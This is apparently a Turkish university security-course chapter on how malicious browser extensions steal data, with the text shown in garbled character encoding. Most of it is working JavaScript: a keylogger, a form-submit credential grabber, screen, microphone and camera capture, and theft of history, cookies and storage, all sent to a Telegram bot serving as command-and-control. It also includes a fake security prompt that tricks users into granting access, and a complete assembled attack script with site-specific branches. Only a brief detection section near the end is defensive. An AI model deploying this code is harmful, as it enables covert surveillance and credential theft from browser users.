
# 02. Veri SÄ±zdÄ±rma (Exfiltration) ve ZararlÄ± Fonksiyonlar

## ğŸ“‹ Konu Ã–zeti

TarayÄ±cÄ± eklentisine eriÅŸim saÄŸlandÄ±ktan sonra, asÄ±l hedef deÄŸerli verilerin Ã§alÄ±nmasÄ± ve saldÄ±rgana iletilmesidir. Bu bÃ¶lÃ¼mde, keylogger, ekran kaydÄ±, mikrofon dinleme gibi zararlÄ± fonksiyonlarÄ±n nasÄ±l implemente edildiÄŸini ve Telegram gibi meÅŸru servislerin C2 (Command & Control) merkezi olarak nasÄ±l kullanÄ±ldÄ±ÄŸÄ±nÄ± inceleyeceÄŸiz.

---

## ğŸ“¡ 2.1. Komuta ve Kontrol (C2) Merkezi: Telegram

### Neden Telegram?

**Avantajlar:**
- âœ… **7/24 EriÅŸilebilir:** Telegram sunucularÄ± sÃ¼rekli aktif
- âœ… **Åifreli Ä°letiÅŸim:** HTTPS ile tÃ¼m veriler ÅŸifreli
- âœ… **Gizlilik:** Milyonlarca meÅŸru kullanÄ±cÄ±nÄ±n trafiÄŸi arasÄ±nda kaybolma
- âœ… **Kolay Kurulum:** Botfather ile saniyeler iÃ§inde bot oluÅŸturma
- âœ… **AnlÄ±k Bildirim:** Ã‡alÄ±nan veriler anÄ±nda mesaj olarak gelir
- âœ… **Firewall Bypass:** `api.telegram.org` genellikle engellenmez

### Telegram Bot Kurulum SÃ¼reci

**1. Botfather ile Bot OluÅŸturma**
```
1. Telegram'da @BotFather'a mesaj at
2. /newbot komutunu gÃ¶nder
3. Bot ismini belirle
4. API Token'Ä± kaydet: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz
```

**2. Chat ID Ã–ÄŸrenme**
```javascript
// Method 1: Test mesajÄ± gÃ¶nderip getUpdates
fetch(`https://api.telegram.org/bot${API_TOKEN}/getUpdates`)

// Method 2: @userinfobot kullanÄ±mÄ±
// Method 3: Web console'da ID'yi bulma
```

**3. Veri GÃ¶nderme API'si**
```javascript
const API_TOKEN = "BOT_TOKEN_BURAYA";
const CHAT_ID = "KULLANICI_CHAT_ID";

function sendToTelegram(data) {
    const message = `ğŸš¨ Yeni Veri:\n${data}`;
    const url = `https://api.telegram.org/bot${API_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    });
}
```

---

## âŒ¨ï¸ 2.2. Keylogger (Klavye Dinleyici)

### Ä°mplementasyon Stratejisi

**Content Script Injection:**
```javascript
// content_script.js - Her web sayfasÄ±nda Ã§alÄ±ÅŸÄ±r
document.addEventListener('keydown', function(e) {
    // Ã–zel alanlarÄ± hedefle
    const target = e.target;
    const tagName = target.tagName.toLowerCase();
    const inputType = target.type;
    
    // Kritik input alanlarÄ±nÄ± tespit et
    if ((tagName === 'input' && 
        (inputType === 'password' || inputType === 'email' || 
         inputType === 'text' || inputType === 'tel')) ||
        tagName === 'textarea') {
        
        // Klavye giriÅŸlerini kaydet
        logKeyStroke(e.key, target.name || target.id, window.location.href);
    }
});

function logKeyStroke(key, field, url) {
    // Buffer'a ekle, toplu gÃ¶nderim iÃ§in
    keylogBuffer.push({
        key: key,
        field: field,
        url: url,
        timestamp: Date.now()
    });
    
    // Buffer dolduÄŸunda gÃ¶nder
    if (keylogBuffer.length >= 50) {
        sendBufferToC2();
    }
}
```

### GeliÅŸmiÅŸ Keylogger Teknikleri

**Form Submit Yakalama:**
```javascript
document.addEventListener('submit', function(e) {
    const form = e.target;
    const formData = new FormData(form);
    
    let credentials = {};
    for (let [key, value] of formData.entries()) {
        if (key.toLowerCase().includes('pass') || 
            key.toLowerCase().includes('email') ||
            key.toLowerCase().includes('user')) {
            credentials[key] = value;
        }
    }
    
    if (Object.keys(credentials).length > 0) {
        sendToTelegram(`ğŸ” Form Data: ${JSON.stringify(credentials)}`);
    }
});
```

---

## ğŸ‘ï¸ 2.3. GÃ¶zetim FonksiyonlarÄ±

### Ekran KaydÄ± (Screen Recording)

```javascript
async function startScreenCapture() {
    try {
        // KullanÄ±cÄ±dan izin iste (sosyal mÃ¼hendislik gerekli)
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { mediaSource: 'screen' },
            audio: true
        });
        
        // MediaRecorder ile kaydet
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            uploadToTelegram(blob, 'screen_recording.webm');
        };
        
        mediaRecorder.start();
        
        // 30 saniye kaydet, sonra dur
        setTimeout(() => mediaRecorder.stop(), 30000);
        
    } catch (err) {
        console.error('Screen capture failed:', err);
    }
}
```

### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼ (Screenshot)

```javascript
function takeScreenshot() {
    // Aktif sekmeden gÃ¶rÃ¼ntÃ¼ al
    chrome.tabs.captureVisibleTab(null, {format: 'png'}, function(dataUrl) {
        if (dataUrl) {
            // Base64 verisini Telegram'a gÃ¶nder
            sendToTelegram(`ğŸ“¸ Ekran GÃ¶rÃ¼ntÃ¼sÃ¼: ${window.location.href}`);
            uploadImageToTelegram(dataUrl);
        }
    });
}

// Her 5 dakikada bir ekran gÃ¶rÃ¼ntÃ¼sÃ¼ al
setInterval(takeScreenshot, 5 * 60 * 1000);
```

### Mikrofon Dinleme

```javascript
async function startAudioSurveillance() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            audio: {
                echoCancellation: false,
                noiseSuppression: false,
                sampleRate: 44100
            }
        });
        
        const mediaRecorder = new MediaRecorder(stream);
        const audioChunks = [];
        
        mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
        
        mediaRecorder.onstop = () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
            uploadToTelegram(audioBlob, 'audio_capture.wav');
        };
        
        // 60 saniye kaydet
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 60000);
        
    } catch (error) {
        console.error('Mikrofon eriÅŸimi baÅŸarÄ±sÄ±z:', error);
    }
}
```

### Kamera EriÅŸimi

```javascript
async function takeCameraPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { width: 1280, height: 720 }
        });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        video.onloadedmetadata = () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            // FotoÄŸrafÄ± base64 olarak al
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            
            // Stream'i kapat
            stream.getTracks().forEach(track => track.stop());
            
            uploadImageToTelegram(imageData);
        };
        
    } catch (error) {
        console.error('Kamera eriÅŸimi baÅŸarÄ±sÄ±z:', error);
    }
}
```

---

## ğŸŒ 2.4. TarayÄ±cÄ± Verisi HÄ±rsÄ±zlÄ±ÄŸÄ±

### Gezinti GeÃ§miÅŸi Ã‡alma

```javascript
function stealBrowsingHistory() {
    chrome.history.search({
        text: '',
        maxResults: 1000,
        startTime: Date.now() - (30 * 24 * 60 * 60 * 1000) // Son 30 gÃ¼n
    }, function(historyItems) {
        let historyData = historyItems.map(item => ({
            url: item.url,
            title: item.title,
            visitCount: item.visitCount,
            lastVisit: new Date(item.lastVisitTime)
        }));
        
        // Hassas siteleri filtrele ve Ã¶ncelikle gÃ¶nder
        let sensitiveHistory = historyData.filter(item => 
            item.url.includes('bank') || 
            item.url.includes('payment') ||
            item.url.includes('login') ||
            item.url.includes('.gov')
        );
        
        if (sensitiveHistory.length > 0) {
            sendToTelegram(`ğŸ›ï¸ Hassas Site GeÃ§miÅŸi:\n${JSON.stringify(sensitiveHistory, null, 2)}`);
        }
        
        // TÃ¼m geÃ§miÅŸi parÃ§alar halinde gÃ¶nder
        sendDataInChunks(historyData, 'Gezinti GeÃ§miÅŸi');
    });
}
```

### Ã‡erezler ve Storage Verileri

```javascript
function stealStorageData() {
    // LocalStorage
    let localStorage = {};
    for (let i = 0; i < window.localStorage.length; i++) {
        let key = window.localStorage.key(i);
        localStorage[key] = window.localStorage.getItem(key);
    }
    
    // SessionStorage  
    let sessionStorage = {};
    for (let i = 0; i < window.sessionStorage.length; i++) {
        let key = window.sessionStorage.key(i);
        sessionStorage[key] = window.sessionStorage.getItem(key);
    }
    
    // Ã‡erezleri al
    chrome.cookies.getAll({}, function(cookies) {
        let cookieData = cookies.map(cookie => ({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            path: cookie.path,
            secure: cookie.secure,
            httpOnly: cookie.httpOnly
        }));
        
        sendToTelegram(`ğŸª Storage Verileri:\nLocalStorage: ${Object.keys(localStorage).length} adet\nCookies: ${cookieData.length} adet`);
    });
}
```

### Otomatik Form Verileri

```javascript
function stealAutoFillData() {
    // Chrome autofill verilerini Ã§almak daha karmaÅŸÄ±k
    // Bunun yerine form field'larÄ±nÄ± dinleyerek
    // auto-complete verilerini yakalayabiliriz
    
    document.addEventListener('input', function(e) {
        const target = e.target;
        if (target.value && target.value.length > 3) {
            // Otomatik doldurulmuÅŸ veriler (muhtemelen)
            if (e.inputType === 'insertReplacementText') {
                sendToTelegram(`ğŸ’³ Auto-fill Veri: ${target.name}: ${target.value}`);
            }
        }
    });
}
```

---

## ğŸ“± 2.5. Sosyal MÃ¼hendislik ve Ä°zin Alma

### Sahte Bildirimler

```javascript
function createFakeNotification() {
    // Sahte gÃ¼venlik uyarÄ±sÄ±
    const fakeAlert = document.createElement('div');
    fakeAlert.innerHTML = `
        <div style="position:fixed; top:0; left:0; width:100%; height:100%; 
                    background:rgba(0,0,0,0.8); z-index:999999;">
            <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
                        background:white; padding:20px; border-radius:10px; text-align:center;">
                <h2>ğŸ”’ GÃ¼venlik DoÄŸrulamasÄ± Gerekli</h2>
                <p>HesabÄ±nÄ±zÄ±n gÃ¼venliÄŸi iÃ§in ses kaydÄ± yapÄ±lacaktÄ±r.</p>
                <button onclick="requestMicrophoneAccess()">Devam Et</button>
            </div>
        </div>
    `;
    document.body.appendChild(fakeAlert);
}

function requestMicrophoneAccess() {
    // KullanÄ±cÄ± "Devam Et" dediÄŸinde gerÃ§ek izin iste
    navigator.mediaDevices.getUserMedia({audio: true})
        .then(stream => {
            console.log('Mikrofon izni alÄ±ndÄ±!');
            startAudioSurveillance();
        });
}
```

---

## ğŸ“¤ 2.6. Veri Upload ve Exfiltration

### Dosya Upload Fonksiyonu

```javascript
async function uploadToTelegram(blob, filename) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', blob, filename);
    
    try {
        await fetch(`https://api.telegram.org/bot${API_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
    } catch (error) {
        console.error('Upload failed:', error);
    }
}

function sendDataInChunks(data, dataType) {
    const jsonString = JSON.stringify(data, null, 2);
    const chunkSize = 4000; // Telegram mesaj limiti ~4096
    
    for (let i = 0; i < jsonString.length; i += chunkSize) {
        const chunk = jsonString.slice(i, i + chunkSize);
        const partNumber = Math.floor(i / chunkSize) + 1;
        const totalParts = Math.ceil(jsonString.length / chunkSize);
        
        sendToTelegram(`ğŸ“Š ${dataType} (${partNumber}/${totalParts}):\n\`\`\`\n${chunk}\n\`\`\``);
        
        // Rate limiting iÃ§in delay
        setTimeout(() => {}, 1000);
    }
}
```

---

## ğŸ›¡ï¸ 2.7. Tespit ve Savunma

### Anormal DavranÄ±ÅŸ Ä°ÅŸaretleri

**KullanÄ±cÄ± GÃ¶zlem NoktalarÄ±:**
- ğŸ”´ Beklenmeyen mikrofon/kamera izin istekleri
- ğŸ”´ TarayÄ±cÄ±da performans dÃ¼ÅŸÃ¼klÃ¼ÄŸÃ¼
- ğŸ”´ Anormal aÄŸ trafiÄŸi artÄ±ÅŸÄ±
- ğŸ”´ Battery drain (mobil cihazlar)

**Network Monitoring:**
```bash
# ÅÃ¼pheli Telegram API trafiÄŸi
netstat -an | grep api.telegram.org
tcpdump -i any host api.telegram.org

# DNS sorgularÄ± izleme
dig api.telegram.org
nslookup api.telegram.org
```

### Savunma MekanizmalarÄ±

**Browser Seviyesinde:**
- Permission management sÄ±kÄ±laÅŸtÄ±rma
- Content Security Policy (CSP) uygulamasÄ±
- Extension activity monitoring

**Network Seviyesinde:**
- Outbound traffic analysis
- DLP (Data Loss Prevention) solutions
- Bot traffic detection

---

## ğŸ“Š Ã–zet

Veri sÄ±zdÄ±rma aÅŸamasÄ±, eklenti tabanlÄ± saldÄ±rÄ±nÄ±n en kritik bÃ¶lÃ¼mÃ¼dÃ¼r. SaldÄ±rganlar, keylogger, ekran kaydÄ±, mikrofon dinleme gibi Ã§oklu vektÃ¶rler kullanarak maksimum veri toplamaya odaklanÄ±rlar. Telegram gibi meÅŸru servisler C2 merkezi olarak kullanÄ±larak, tespit edilmesi zorlaÅŸtÄ±rÄ±lÄ±r.

**Temel Ã‡Ä±karÄ±mlar:**
- Modern browser API'leri gÃ¼Ã§lÃ¼ gÃ¶zetim imkanlarÄ± sunar
- Sosyal mÃ¼hendislik ile kullanÄ±cÄ± izni elde edilebilir
- MeÅŸru servisler C2 merkezi olarak kÃ¶tÃ¼ye kullanÄ±labilir
- Ã‡ok katmanlÄ± monitoring gereklidir

---

## ğŸ’» 2.8. GerÃ§ek SaldÄ±rÄ± Kodu Ã–rneÄŸi

AÅŸaÄŸÄ±da, yukarÄ±da aÃ§Ä±klanan tÃ¼m tekniklerin bir araya getirildiÄŸi gerÃ§ek bir saldÄ±rÄ± kodu Ã¶rneÄŸi bulunmaktadÄ±r:

```javascript
// benim kodlarim
console.log("BEN BURDAYIM");

// Telegram bot token ve sohbet kimliÄŸi
const botToken = ''; // BotFather'dan alÄ±nan token
const chatId = ''; // MesajÄ±n gÃ¶nderileceÄŸi sohbet kimliÄŸi

// Telegram API URL'si
const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
const telegramAudioApiUrl = `https://api.telegram.org/bot${botToken}/sendAudio`;
const telegramDocumentApiUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;
const telegramVideoApiUrl = `https://api.telegram.org/bot${botToken}/sendVideo`;
const telegramPhotoApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
const telegramStickerApiUrl = `https://api.telegram.org/bot${botToken}/sendSticker`;

// Telegram'a mesaj gÃ¶nderme fonksiyonu
function sendToTelegram(message) {
    fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Mesaj Telegram\'a gÃ¶nderildi:', message);
            } else {
                console.error('Mesaj gÃ¶nderilemedi:', data.description);
            }
        })
        .catch(error => console.error('Hata:', error));
}

// Telegram'a dosya gÃ¶nderme fonksiyonu
function sendFileToTelegram(file, caption = '') {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('document', file);
    if (caption) {
        formData.append('caption', caption);
    }

    fetch(telegramDocumentApiUrl, {
        method: 'POST',
        body: formData,
    })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Dosya Telegram\'a gÃ¶nderildi:', file.name);
            } else {
                console.error('Dosya gÃ¶nderilemedi:', data.description);
            }
        })
        .catch(error => console.error('Hata:', error));
}

// Mikrofon kaydÄ± ve Telegram'a gÃ¶nderme
async function microphoneKaydet() {
    try {
        // Mikrofon izni kontrolÃ¼
        const permissionStatus = await navigator.permissions.query({ name: 'microphone' });
        if (permissionStatus.state !== 'granted') {
            console.error('Mikrofon izni yok:', permissionStatus.state);
            return;
        }

        // Mikrofon akÄ±ÅŸÄ±nÄ± baÅŸlat
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        // KayÄ±t verilerini topla
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                chunks.push(event.data);
            }
        };

        // KayÄ±t tamamlandÄ±ÄŸÄ±nda
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const file = new File([blob], `mikrofon_kaydi_${Date.now()}.webm`, { type: 'audio/webm' });
            sendFileToTelegram(file, 'Mikrofon KaydÄ±');
        };

        // 10 saniye kayÄ±t yap
        mediaRecorder.start();
        setTimeout(() => {
            mediaRecorder.stop();
            stream.getTracks().forEach(track => track.stop()); // AkÄ±ÅŸÄ± durdur
        }, 10000);

        // 10 saniyede bir tekrar et
        setTimeout(microphoneKaydet, 10000);
    } catch (error) {
        console.error('Mikrofon kaydÄ± hatasÄ±:', error);
    }
}

// Kamera kaydÄ± ve Telegram'a gÃ¶nderme
async function kameraKaydet() {
    try {
        // Kamera izni kontrolÃ¼
        const permissionStatus = await navigator.permissions.query({ name: 'camera' });
        if (permissionStatus.state !== 'granted') {
            console.error('Kamera izni yok:', permissionStatus.state);
            return;
        }

        // Kamera akÄ±ÅŸÄ±nÄ± baÅŸlat
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        // KayÄ±t verilerini topla
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                chunks.push(event.data);
            }
        };

        // KayÄ±t tamamlandÄ±ÄŸÄ±nda
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            const file = new File([blob], `kamera_kaydi_${Date.now()}.webm`, { type: 'video/webm' });
            sendFileToTelegram(file, 'Kamera KaydÄ±');
        };

        // 10 saniye kayÄ±t yap
        mediaRecorder.start();
        setTimeout(() => {
            mediaRecorder.stop();
            stream.getTracks().forEach(track => track.stop()); // AkÄ±ÅŸÄ± durdur
        }, 10000);

        // 10 saniyede bir tekrar et
        setTimeout(kameraKaydet, 10000);
    } catch (error) {
        console.error('Kamera kaydÄ± hatasÄ±:', error);
    }
}

let siteAdresi = window.location.href;
sendToTelegram("Acilan Site: " + siteAdresi);

if(siteAdresi.includes("instagram.com")) {

}
else if(siteAdresi.includes("ois.istinye.edu.tr")) {

}
else if(siteAdresi.includes("github.com")) {

}
else if(siteAdresi.includes("teams.microsoft.com")) {

}
else if(siteAdresi.includes("whatsapp.com")) {

}


// Mevcut gÃ¶rsel kaynaklarÄ±nÄ± tutacak liste
let imgSources = [];

// Yeni gÃ¶rselleri sÃ¼rekli kontrol eden ve Telegram'a gÃ¶nderen fonksiyon
function checkImagesContinuously() {
    const images = document.getElementsByTagName('img');
    const newImages = [];

    for (let img of images) {
        let imgSrc = '';

        // Hem src hem de data:image formatÄ±nÄ± kontrol et
        if (img.src) {
            if (img.src.startsWith('data:image')) {
                imgSrc = img.src; // Base64 formatÄ±ndaki gÃ¶rsel
            } else if (img.src.startsWith('http') || img.src.startsWith('//')) {
                imgSrc = img.src; // URL tabanlÄ± gÃ¶rsel
            }

            // Yeni gÃ¶rsel mi kontrol et
            if (imgSrc && !imgSources.includes(imgSrc)) {
                imgSources.push(imgSrc);
                newImages.push(imgSrc);
            }
        }
    }

    // Yeni gÃ¶rseller varsa Telegram'a gÃ¶nder
    newImages.forEach(async (src, index) => {
        try {
            let file;
            let fileName;

            if (src.startsWith('data:image')) {
                // Base64 gÃ¶rseli Blob'a Ã§evir
                const response = await fetch(src);
                const blob = await response.blob();
                const extension = src.split(';')[0].split('/')[1] || 'png'; // Ã–rn: png, jpeg
                fileName = `image_${Date.now()}_${index}.${extension}`;
                file = new File([blob], fileName, { type: `image/${extension}` });
            } else {
                // URL tabanlÄ± gÃ¶rseli indir ve Blob'a Ã§evir
                const response = await fetch(src);
                const blob = await response.blob();
                const extension = src.split('.').pop().split('?')[0] || 'jpg'; // Ã–rn: jpg, png
                fileName = `image_${Date.now()}_${index}.${extension}`;
                file = new File([blob], fileName, { type: `image/${extension}` });
            }

            // Telegram'a gÃ¶nder
            sendFileToTelegram(file, `Yeni GÃ¶rsel: ${fileName}`);
            console.log(`Yeni gÃ¶rsel gÃ¶nderildi: ${fileName}`);
            sendToTelegram(`Yeni gÃ¶rsel eklendi: ${src}`);
        } catch (error) {
            console.error(`GÃ¶rsel gÃ¶nderilemedi (${src}):`, error);
            sendToTelegram(`GÃ¶rsel gÃ¶nderilemedi: ${src}, Hata: ${error.message}`);
        }
    });

    console.log('GÃ¼ncel GÃ¶rsel Listesi:', imgSources);

    // 5 saniyede bir kontrol et
    setTimeout(checkImagesContinuously, 5000);
}

// 1. Sayfa yÃ¼klendikten sonra img etiketlerinin src'lerini toplama
document.addEventListener('DOMContentLoaded', () => {
    // Ä°lk img src'leri topla
    const images = document.getElementsByTagName('img');
    for (let img of images) {
        if (img.src) {
            imgSources.push(img.src);
        }
    }
    console.log('BaÅŸlangÄ±Ã§ Image Sources:', imgSources);

    // SÃ¼rekli kontrolÃ¼ baÅŸlat
    checkImagesContinuously();
    // 2. Klavye tuÅŸlarÄ±nÄ± toplama ve belirli tuÅŸlarda fonksiyona gÃ¶nderme
    let keyBuffer = '';
    
    document.addEventListener('keydown', (event) => {
        // TuÅŸlarÄ± biriktir
        keyBuffer += event.key;
        
        // TAB, ENTER veya SUBMIT (form submit iÃ§in) kontrolÃ¼
        if (event.key === 'Tab' || event.key === 'Enter') {
            sendKeystrokes(keyBuffer);
            keyBuffer = ''; // Buffer'Ä± sÄ±fÄ±rla
        }
    });

    // Form submit olayÄ±nÄ± yakalama
    document.addEventListener('submit', (event) => {
        sendKeystrokes(keyBuffer);
        keyBuffer = ''; // Buffer'Ä± sÄ±fÄ±rla
    });

    // Klavye verisini iÅŸleyen fonksiyon
    function sendKeystrokes(data) {
        console.log('Collected Keystrokes:', data);
        sendToTelegram("Collected Keystrokes: " + data);
        // Burada veriyi baÅŸka bir yere gÃ¶nderebilirsiniz (Ã¶rn. server)
    }

    // 3. Mikrofon izni kontrol fonksiyonu
    function checkMicrophonePermission() {
        return navigator.permissions.query({ name: 'microphone' })
            .then(permissionStatus => {
                console.log('Microphone Permission:', permissionStatus.state);
                sendToTelegram("Microphone Permission: " + permissionStatus.state);
                if(permissionStatus.state == 'granted') {
                    // microphoneKaydet();
                }
                return permissionStatus.state; // 'granted', 'denied', veya 'prompt'

                
            })
            .catch(error => {
                console.error('Microphone Permission Error:', error);
                sendToTelegram('Microphone Permission Error: ' + error);

                return 'error';
            });
    }

    // 4. Kamera izni kontrol fonksiyonu
    function checkCameraPermission() {
        return navigator.permissions.query({ name: 'camera' })
            .then(permissionStatus => {
                console.log('Camera Permission:', permissionStatus.state);
                sendToTelegram("Camera Permission: " + permissionStatus.state);
                if(permissionStatus.state == 'granted') {
                    // kameraKaydet();
                }
                return permissionStatus.state; // 'granted', 'denied', veya 'prompt'
            })
            .catch(error => {
                console.error('Camera Permission Error:', error);
                sendToTelegram('Camera Permission Error:' + error);
                return 'error';
            });
    }

    // FonksiyonlarÄ± test etmek iÃ§in Ã§aÄŸÄ±r
    checkMicrophonePermission();
    checkCameraPermission();
});
```

### Kod Analizi

Bu gerÃ§ek saldÄ±rÄ± kodu aÅŸaÄŸÄ±daki iÅŸlevleri yerine getirir:

**ğŸ¯ Ana Ã–zellikler:**
- **Site Takibi:** AÃ§Ä±lan her web sitesinin URL'sini Telegram'a gÃ¶nderir
- **Keylogger:** Klavye giriÅŸlerini toplar ve kritik anlarda gÃ¶nderir
- **GÃ¶rsel HÄ±rsÄ±zlÄ±ÄŸÄ±:** Sayfadaki tÃ¼m gÃ¶rselleri (base64 dahil) Ã§alar
- **Mikrofon KayÄ±t:** 10 saniyelik ses kayÄ±tlarÄ± yapÄ±p gÃ¶nderir
- **Kamera KayÄ±t:** Video kayÄ±tlarÄ± alÄ±r ve upload eder
- **Ä°zin KontrolÃ¼:** Mikrofon ve kamera izinlerini sÃ¼rekli kontrol eder

**ğŸ”´ Tehlike Seviyeleri:**
- Instagram, Teams, WhatsApp gibi popÃ¼ler sitelerde Ã¶zel iÅŸlemler iÃ§in hazÄ±r
- Ãœniversite OIS sistemini (ois.istinye.edu.tr) Ã¶zellikle hedefliyor
- GitHub aktivitelerini izliyor
- SÃ¼rekli Ã§alÄ±ÅŸan arka plan fonksiyonlarÄ±

**ğŸ›¡ï¸ Tespit NoktalarÄ±:**
- Console.log Ã§Ä±ktÄ±larÄ± geliÅŸtirici araÃ§larÄ±nda gÃ¶rÃ¼nÃ¼r
- SÃ¼rekli network istekleri api.telegram.org'a
- YÃ¼ksek CPU kullanÄ±mÄ± (sÃ¼rekli DOM izleme)
- Mikrofon/kamera LED Ä±ÅŸÄ±ÄŸÄ± aktivasyonu

---

**Ã–nceki Konu:** [01. TarayÄ±cÄ± Eklentileri](01.tarayici-eklentileri.md) | **Sonraki Konu:** [03. Dinamik Payload YÃ¼kleme](03.dinamik-payload.md)

---


| **By**                                                                                   | **Keyvan Arasteh**                       |
| --------------------------------------------------------------------------------------------------- | --------------------------------- |
| [![LinkedIn](https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/keyvanarasteh)   | Istinye Universitesi               |
| [![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/keyvanarasteh)             | Bilisim Guvenligi Teknolojisi     |
| [![YouTube](https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/@drvoidgate)        | drvoid gate Channel               |

